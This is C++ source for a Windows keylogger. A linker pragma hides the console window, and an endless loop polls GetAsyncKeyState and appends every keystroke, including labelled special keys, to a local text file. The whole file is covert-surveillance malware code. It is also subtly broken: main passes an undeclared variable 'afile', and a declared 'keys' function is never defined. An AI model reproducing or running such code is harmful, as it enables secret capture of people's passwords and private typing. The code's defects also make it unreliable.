#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
#include <iostream>
#include <windows.h>
#include <fstream>
#include <conio.h>


using namespace std;

int keys(char keystroke, fstream&);


int OutputKey(char keystroke, fstream& file) {

    file.open("key_file.txt", ios::app | ios::in | ios::out);
    if (file) {
        if (GetAsyncKeyState(VK_ESCAPE)) {
            file << "[ESCAPE]";
        }
        else if (GetAsyncKeyState(VK_RETURN)) {
            file << "[ENTER]";
        }
        else if (GetAsyncKeyState(VK_CONTROL)) {
            file << "[CONTROL]";
        }
        else if (GetAsyncKeyState(VK_MENU)) {
            file << "[ALT]";
        }
        else if (GetAsyncKeyState(VK_DELETE)) {
            file << "[DELETE]";
        }
        else if (GetAsyncKeyState(VK_TAB)) {
            file << "[TAB]";
        }
        else if (GetAsyncKeyState(VK_BACK)) {
            file << "[BACKSPACE]";
        }
        else if (GetAsyncKeyState(VK_SHIFT)) {
            return 0;
        }
        else {
            file << keystroke;
        }
    }

    file.close();

    return 0;
}


int main() {


    fstream outputFile;

    outputFile.open("key_file.txt", ios::in | ios::out);
    outputFile.close();

    while (true) {


         for(int i=8; i<256; i++){
           if(GetAsyncKeyState(i) == -32767)
           {
             OutputKey(i, afile);
           }
         }

    }
    return 0;
}

